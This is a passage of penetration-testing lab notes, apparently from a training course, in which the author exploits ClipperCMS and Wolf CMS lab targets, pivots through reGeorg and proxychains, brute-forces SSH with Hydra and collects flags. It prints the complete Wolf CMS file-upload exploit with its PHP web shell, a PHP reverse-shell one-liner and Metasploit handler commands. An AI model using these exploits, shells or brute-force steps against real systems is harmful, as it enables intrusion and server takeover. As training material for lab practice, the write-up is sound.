|DNS-response|: ::1 does not exist
usage: python ./38730.py http://example.com/ClipperCMS/ admin admin ←
```

`proxychains python ./38730.py http://192.227.191.3/clipper/ admin password`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ::1 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: ::1 does not exist
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
successful: login as admin
successful: user is allowed to use file manager. Full path: /app/clipper/
successful: .htaccess upload
successful: shell upload. Execute commands via http://192.227.191.3/clipper/404.png?x=<COMMAND>
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
successful: shell seems to be working ←
enter command, or enter exit to quit.
```

<span style="color: #64b5f6;">**Target 2 machine**</span>.

`whoami`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
www-data ←
```

`hostname`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
target-2 ←
```

`find / -iname "*flag*" 2> /dev/null`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
/usr/lib/perl/5.18.2/bits/waitflags.ph
/usr/bin/flag1.txt ←
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/ip_vti0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
```

`cat /usr/bin/flag1.txt`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
c46dd76701afd376d12f3340c1ce16b4 ←
```

### Pivoting with reGeorg - Theory/Lab

#### Lab Environment

In this pivoting challenge, the network architecture is as shown below:
 `attacker`  ---> `target-1` ---> `target-2`

A webapp is running on `target-1`.
You have managed to get the following credentials for this webapp by using phishing:
- Username :  "robert"
- Password  :  "password1"
- Login URL :  `http://target-1/?/admin`.
 
Your mission is to get the flags kept in flag text files on both `target-1` and `target-2`.

Instructions: 
- The `target-1` should be located at the IP address `192.X.Y.3`.
- Once you compromise `target-1`, you should be able to use that as a pivot to exploit `target-2`.

How to solve this?
- Metasploit is installed on the Kali instance you will get access to.
- All exploitation can happen using manual exploitation methods, Hydra and third party tools.
- You are free to use other tools line Nmap for enumeration.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

`cat /etc/hosts`:
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
10.1.0.7	attackdefense.com attackdefense
192.248.127.2	attackdefense.com attackdefense
192.248.127.2     attacker
192.248.127.3     target-1 ←
```

`ping -c 3 target-1`:
```
PING target-1 (192.248.127.3) 56(84) bytes of data.
64 bytes from target-1 (192.248.127.3): icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from target-1 (192.248.127.3): icmp_seq=2 ttl=64 time=0.073 ms
64 bytes from target-1 (192.248.127.3): icmp_seq=3 ttl=64 time=0.078 ms

--- target-1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 35ms ←
rtt min/avg/max/mdev = 0.057/0.069/0.078/0.011 ms
```

`nmap -Pn -sS -sV target-1 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-23 13:00 IST
Nmap scan report for target-1 (192.248.127.3)
Host is up (0.000024s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu)) ←
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
MAC Address: 02:42:C0:F8:7F:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
```

`curl -I http://target-1/`:
```
HTTP/1.1 200 OK
Date: Fri, 23 Aug 2024 07:36:29 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25 ←
Set-Cookie: PHPSESSID=3tb7k01dl2ho7k6f04tqce69i3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: PHPSESSID=96o0hhd5b1e3gnklpcj5q0c9e3; path=/
Content-Type: text/html; charset=UTF-8
```

`curl http://target-1/`:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-GB">

<head>
	<title>Home Page</title>

  <meta http-equiv="content-type" content="application/xhtml+xml; charset=utf-8" />
  <meta name="robots" content="index, follow" />
  <meta name="description" content="Default description goes here" />
  <meta name="keywords" content="default, keywords, here" />
  <meta name="author" content="Author Name" />

</head>
<body>

...

<!-- FOOTER - COULD BE SNIPPET / START -->
<div id="footer">

  <p>&copy; Copyright 2024 <a href="http://www.wolfcms.org/" title="Wolf">Your name</a><br /> ←
  <a href="http://www.wolfcms.org/" title="Wolf CMS">Wolf CMS</a> Inside.
  </p>
  
</div><!-- / #footer -->
<!-- FOOTER / END -->

</body>
```

`searchsploit wolf cms`:
```
------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                               |  Path
                                                                                                                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Wolf CMS - Arbitrary File Upload / Execution                                                                                                                 | exploits/php/webapps/38000.txt
Wolf CMS 0.6.0b - Multiple Vulnerabilities                                                                                                                   | exploits/php/webapps/15614.html
Wolf CMS 0.7.5 - Multiple Vulnerabilities                                                                                                                    | exploits/php/webapps/18545.txt
Wolf CMS 0.8.2 - Arbitrary File Upload                                                                                                                       | exploits/php/webapps/36818.php ←
Wolf CMS 0.8.2 - Arbitrary File Upload (Metasploit)                                                                                                          | exploits/php/remote/40004.rb
WolfCMS 0.8.3.1 - Cross-Site Request Forgery                                                                                                                 | exploits/php/webapps/44418.txt
WolfCMS 0.8.3.1 - Open Redirection                                                                                                                           | exploits/php/webapps/44421.txt
WolfSight CMS 3.2 - SQL Injection                                                                                                                            | exploits/php/webapps/44997.txt
Wolfcms 0.75 - Cross-Site Request Forgery / Cross-Site Scripting                                                                                             | exploits/php/webapps/18652.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

`cp /usr/share/explitdb/exploits/php/webapps/36818.php ./`

`ls -alps ./`:
```
total 124
8 drwx------ 1 root root 4096 Aug 23 13:20 ./
4 drwxr-xr-x 1 root root 4096 Aug 23 12:58 ../
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 .BurpSuite/
4 -rw------- 1 root root  111 Aug 23 12:58 .Xauthority
4 -rw-r--r-- 1 root root   47 Apr 30  2019 .bashrc
4 drwx------ 1 root root 4096 Aug 23 13:03 .cache/
8 drwxr-xr-x 1 root root 4096 Aug 23 12:58 .config/
4 drwxr-xr-x 3 root root 4096 May 14  2019 .gem/
4 drwxr-xr-x 3 root root 4096 Apr 30  2019 .java/
8 drwxr-xr-x 1 root root 4096 Aug 23 13:01 .mozilla/
8 drwxr-xr-x 1 root root 4096 Aug 23 13:10 .msf4/
4 -rw-r--r-- 1 root root  148 Oct 30  2017 .profile
4 drwxr-xr-x 4 root root 4096 Apr 30  2019 .themes/
4 drwx------ 4 root root 4096 Aug 23 12:58 .thumbnails/
8 drwxr-xr-x 1 root root 4096 Aug 23 12:58 .vnc/
4 -rw-r--r-- 1 root root  165 May  9  2019 .wget-hsts
8 -rw-r--r-- 1 root root 7115 Aug 23 13:20 36818.php ←
4 drwxr-xr-x 1 root root 4096 May 14  2019 Desktop/
4 drwxr-xr-x 2 root root 4096 Aug 23 12:58 Documents/
4 drwxr-xr-x 2 root root 4096 Aug 23 12:58 Downloads/
4 drwxr-xr-x 2 root root 4096 Aug 23 12:58 Music/
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 Pictures/
4 drwxr-xr-x 2 root root 4096 Aug 23 12:58 Public/
4 drwxr-xr-x 2 root root 4096 Aug 23 12:58 Templates/
4 drwxr-xr-x 2 root root 4096 Aug 23 12:58 Videos/
```

`cat ./36818.php`:
```php
<?php
/*
 
  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /        
  / XXXXXX /
 (________(          
  `------'
  
 Exploit Title   : Wolf CMS Arbitrary File Upload Exploit
 Date            : 22 April 2015
 Exploit Author  : CWH Underground
 Discovered By   : ZeQ3uL
 Site            : www.2600.in.th
 Vendor Homepage : https://www.wolfcms.org/
 Software Link   : https://bitbucket.org/wolfcms/wolf-cms-downloads/downloads/wolfcms-0.8.2.zip
 Version         : 0.8.2
   
####################
SOFTWARE DESCRIPTION
####################
   
Wolf CMS is a content management system and is Free Software published under the GNU General Public License v3. 
Wolf CMS is written in the PHP programming language. Wolf CMS is a fork of Frog CMS.
   
#######################################
VULNERABILITY: Arbitrary File Upload
#######################################
    
This exploit a file upload vulnerability found in Wolf CMS 0.8.2, and possibly prior. Attackers can abuse the
upload feature in order to upload a malicious PHP file into the application with authenticated user, which results in arbitrary remote code execution. ←

The vulnerability was found on File Manager Function (Enabled by default), which provides interfaces to manage files from the administration. 

In this simple example, there are no restrictions made regarding the type of files allowed for uploading. 
Therefore, an attacker can upload a PHP shell file with malicious code that can lead to full control of a victim server. ←
Additionally, the uploaded file can be moved to the root directory, meaning that the attacker can access it through the Internet.
   
/wolf/plugins/file_manager/FileManagerController.php (LINE: 302-339)
-----------------------------------------------------------------------------
// Clean filenames
        $filename = preg_replace('/ /', '_', $_FILES['upload_file']['name']);
        $filename = preg_replace('/[^a-z0-9_\-\.]/i', '', $filename);

        if (isset($_FILES)) {
            $file = $this->_upload_file($filename, FILES_DIR . '/' . $path . '/', $_FILES['upload_file']['tmp_name'], $overwrite);

            if ($file === false)
                Flash::set('error', __('File has not been uploaded!'));
        }
-----------------------------------------------------------------------------

#####################
Disclosure Timeline
#####################

[04/04/2015] - Issue reported to Developer Team
[08/04/2015] - Discussed for fixing the issue
[16/04/2015] - Issue reported to http://seclists.org/oss-sec/2015/q2/210
[22/04/2015] - Public disclosure

#####################################################
EXPLOIT
#####################################################
  
*/
 
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 50);
 
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
  
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
 
print "\n+---------------------------------------+";
print "\n| WolfCMS Arbitrary File Upload Exploit |";
print "\n+---------------------------------------+\n";
  
if ($argc < 5)
{
    print "\nUsage......: php $argv[0] <host> <path> <user> <pass>\n";
    print "\nExample....: php $argv[0] localhost /wolfcms test password\n";
    die();
}
 
$host = $argv[1];
$path = $argv[2];
$user = $argv[3];
$pass = $argv[4];

   print "\n  ,--^----------,--------,-----,-------^--,   \n";
   print "  | |||||||||   `--------'     |          O   \n";
   print "  `+---------------------------^----------|   \n";
   print "    `\_,-------, _________________________|   \n";
   print "      / XXXXXX /`|     /                      \n";
   print "     / XXXXXX /  `\   /                       \n";
   print "    / XXXXXX /\______(                        \n";
   print "   / XXXXXX /                                 \n";
   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
   print " (________(                                   \n";
   print "  `------'                                    \n";

$login = "login[username]={$user}&login[password]={$pass}&login[redirect]=/wolfcms/?/admin/";
$packet  = "POST {$path}/?/admin/login/login HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: PHPSESSID=cwh\r\n";
$packet .= "Content-Length: ".strlen($login)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$login}"; 
   
$response = http_send($host, $packet);

 if (!preg_match_all("/Set-Cookie: ([^;]*);/i", $response, $sid)) die("\n[-] Session ID not found!\n");

$packet  = "GET {$path}/?/admin/plugin/file_manager HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: {$sid[1][2]}\r\n";
$packet .= "Connection: close\r\n\r\n";
$response=http_send($host, $packet);

if (!preg_match_all("/csrf_token\" type=\"hidden\" value=\"(.*?)\" \/>/i", $response, $token)) die("\n[-] The username/password is incorrect!\n");
print "\n[+] Login Successfully !!\n";
sleep(2);
print "\n[+] Retrieving The Upload token !!\n";
print "[+] The token is: {$token[1][4]}\n";

$payload  = "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"csrf_token\"\r\n\r\n";
$payload .= "{$token[1][4]}\r\n";
$payload .= "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\"\r\n";
$payload .= "Content-Type: application/octet-stream\r\n\r\n";
$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
$payload .= "--o0oOo0o--\r\n";

$packet  = "POST {$path}/?/admin/plugin/file_manager/upload HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: {$sid[1][2]}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
     
http_send($host, $packet);

$packet  = "GET {$path}/public/shell.php HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
     
while(1)
{
    print "\nWolf-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}

################################################################################################################
# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
?>
```

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.7  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:07  txqueuelen 0  (Ethernet)
        RX packets 14473  bytes 1126040 (1.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13848  bytes 21115189 (20.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.248.127.2  netmask 255.255.255.0  broadcast 192.248.127.255 ←
        ether 02:42:c0:f8:7f:02  txqueuelen 0  (Ethernet)
        RX packets 65876  bytes 3729754 (3.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 65933  bytes 3849430 (3.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 44088  bytes 48502453 (46.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 44088  bytes 48502453 (46.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`sudo service postgresql start`:
```
[ ok ] Starting PostgreSQL 11 database server: main. ←
```

`msfconsole -q`

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD php/reverse_php`, `show options`, `set LHOST 192.248.127.2`, `set LPORT 4444`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.248.127.2:4444 ←
```

`firefox http://target-1/?/admin` > `Username: robert`, `Password: password1` > `Login`

`http://target-1/?/admin/plugin/file_manager` > `Files` > `Upload file` > `Browse: /usr/share/webshells/php/php-backdoor.php` > `Upload`

`http://target-1/public/php-backdoor.php` > `execute command: php -r '$sock = fsockopen("192.248.1127.2", 4444); exec("/bin/sh -i <&3 >&3 2>&3");'` > `Go`

```
[*] Command shell session 1 opened (192.248.127.2:4444 -> 192.248.127.3:34314) at 2024-08-23 13:37:02 +0530 ←
```

<span style="color: #64b5f6;">**Target 1 machine**</span>.

`sessions`, `sessions -i 1`

`whoami`:
```
www-data ←
```

`find / -iname "*flag*" 2> /dev/null`:
```
/app/flag.txt ←
/usr/lib/perl/5.18.2/bits/waitflags.ph
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
```

`cat /app/flag.txt`:
```
17189f8af3efbca5511198c84bbf1e6d ←
```

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

`sessions`:
```
Active sessions
===============

  Id  Name  Type           Information               Connection
  --  ----  ----           -----------               ----------
  1         shell php/php  /bin/sh: 0: Can't open i  192.248.127.2:4444 -> 192.248.127.3:34314 (192.248.127.3) ←
```

`sessions -u 1`:
```
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.248.127.2:4433 
[*] Sending stage (985320 bytes) to 192.248.127.3
[*] Meterpreter session 3 opened (192.248.127.2:4433 -> 192.248.127.3:52830) at 2024-08-23 13:42:17 +0530 ←
[*] Command stager progress: 100.00% (773/773 bytes)
```

`sessions`:
```
Active sessions
===============

  Id  Name  Type                   Information                                             Connection
  --  ----  ----                   -----------                                             ----------
  1         shell php/php          /bin/sh: 0: can't access tty; job control turned off $  192.248.127.2:4444 -> 192.248.127.3:40238 (192.248.127.3)
  2         meterpreter x86/linux  uid=33, gid=33, euid=33, egid=33 @ 192.248.127.3        192.248.127.2:4433 -> 192.248.127.3:52830 (192.248.127.3) ←
```

`sessions -i 2`

<span style="color: #64b5f6;">**Target 1 machine**</span>.

`getuid`:
```
Server username: uid=33, gid=33, euid=33, egid=33 ←
```

`cat /etc/hosts`:
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
192.248.127.3	target-1
192.37.208.2	target-1
192.37.208.3	target-2 ←
```

`ifconfig`:
```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP


Interface 9384
============
Name         : eth0
Hardware MAC : 02:42:c0:f8:7f:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.248.127.3
IPv4 Netmask : 255.255.255.0


Interface 9386
============
Name         : eth1
Hardware MAC : 02:42:c0:25:d0:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.37.208.2 ←
IPv4 Netmask : 255.255.255.0
```

<span style="color: #e57373;">**Attacker machine**</span>.

`cd /root/Desktop/tools`

`ls -alps ./`:
```
total 44
4 drwxr-xr-x 1 root root 4096 May 14  2019 ./
4 drwxr-xr-x 1 root root 4096 May 14  2019 ../
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 Delorean/
4 drwxr-xr-x 3 root root 4096 Apr 30  2019 JohnTheRipper/
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 firepwd/
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 ircsnapshot/
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 known_hosts-hashcat/
4 drwxr-xr-x 3 root root 4096 May 14  2019 portable/
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 reGeorg/ ←
4 drwxr-xr-x 1 root root 4096 May 14  2019 srtp-decrypt/
4 drwxr-xr-x 2 root root 4096 Apr 30  2019 steganography/
```

`cd ./reGeorg`

`ls -alps ./`:
```
total 96
 4 drwxr-xr-x 2 root root  4096 Apr 30  2019 ./
 4 drwxr-xr-x 1 root root  4096 May 14  2019 ../
 4 -rw-r--r-- 1 root root   820 Apr 30  2019 LICENSE.html
 4 -rw-r--r-- 1 root root   214 Apr 30  2019 LICENSE.txt
 4 -rw-r--r-- 1 root root  1929 Apr 30  2019 README.md
16 -rw-r--r-- 1 root root 16228 Apr 30  2019 reGeorgSocksProxy.py ←
 4 -rw-r--r-- 1 root root    37 Apr 30  2019 source
 8 -rw-r--r-- 1 root root  4506 Apr 30  2019 tunnel.ashx
 8 -rw-r--r-- 1 root root  4829 Apr 30  2019 tunnel.aspx
 8 -rw-r--r-- 1 root root  5952 Apr 30  2019 tunnel.js
 8 -rw-r--r-- 1 root root  4800 Apr 30  2019 tunnel.jsp
 8 -rw-r--r-- 1 root root  5974 Apr 30  2019 tunnel.nosocket.php
 8 -rw-r--r-- 1 root root  5697 Apr 30  2019 tunnel.php ←
 8 -rw-r--r-- 1 root root  4769 Apr 30  2019 tunnel.tomcat.5.jsp
```

`firefox http://target-1/?/admin` > `Username: robert`, `Password: password1` > `Login`

`http://target-1/?/admin/plugin/file_manager` > `Files` > `Upload file` > `Browse: /root/Desktop/tools/reGeorg/tunnel.php` > `Upload`

`cat /etc/proxychains.conf`:
```
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#	

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080	
#		
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050 ←
```

`python ./reGeorgSocksProxy.py -p 9050 -u http://target-1/public/tunnel.php`:
```
                     _____
  _____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad
  
   
[INFO   ]  Log Level set to [INFO]
[INFO   ]  Starting socks server [127.0.0.1:9050], tunnel at [http://target-1/public/tunnel.php] ←
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'
```

`netstat -antp | grep ":9050"`:
```
tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      1623/python ←
```

`proxychains nmap -Pn -sT -sV 192.37.208.3 -F`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-23 14:04 IST
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:139-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:25-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:3306-<--denied

...

|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:7-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:26-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
Nmap scan report for 192.37.208.3
Host is up (0.0025s latency).
Not shown: 99 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) ←
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
```

`proxychains hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt ssh://192.37.208.3/ -t 4`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-23 14:08:11
[DATA] max 4 tasks per 1 server, overall 4 tasks, 3957 login tries (l:1/p:3957), ~990 tries per task
[DATA] attacking ssh://192.37.208.3:22/
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-|S-chain|-<>-127.0.0.1:9050-|S-chain|-<>-127.0.0.1:9050-|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-192.37.208.3:22-<><><>-192.37.208.3:22-<>-192.37.208.3:22-<><>-OK
<><>-OK
<><>-OK
<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 3913 to do in 01:29h, 4 active
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
[22][ssh] host: 192.37.208.3   login: root   password: 1234567890 ←
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-23 14:09:44
```

`proxychains ssh root@192.37.208.3`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.37.208.3:22-<><>-OK
The authenticity of host '192.37.208.3 (192.37.208.3)' can't be established.
ECDSA key fingerprint is SHA256:oj5QKRqCuERnTYhUU5/pcJePvp5fRdOOZdFlJoNOYAI.
Are you sure you want to continue connecting (yes/no)? yes ←
Warning: Permanently added '192.37.208.3' (ECDSA) to the list of known hosts.
root@192.37.208.3's password: ←
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

<span style="color: #64b5f6;">**Target 2 machine**</span>.

`whoami`:
```
root ←
```

`find / -iname "*flag*" 2> /dev/null`:
```
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/usr/include/linux/tty_flags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/x86_64-linux-gnu/bits/ss_flags.h
/usr/bin/dpkg-buildflags
/usr/share/dpkg/buildflags.mk
/usr/share/perl5/Dpkg/BuildFlags.pm
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/root/flag.txt ←
```

`cat /root/flag.txt`:
```
f9a32da38bf9fba2b6c7f7b7fe8709a2 ←
```

---

## Linux Lateral Movement and Pivoting

### Linux Lateral Movement and Pivoting: Black-Box Penetration Test (with SOCKS Proxy, SSH Tunneling, Metasploit) - Lab

#### Lab Environment

You will learn to find and exploit vulnerable services in this lab. It will also cover post-exploitation and lateral movement techniques to extract sensitive information to progressively move through a network.

In this lab environment, the user will access a Kali GUI instance. A vulnerable application can be accessed using the tools installed on Kali at `http://demo.ine.local`.

**Objective:** Exploit both the target and find all flags!

Dictionaries to use:
	- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`.

The best tools for this lab are:
- Metasploit Framework
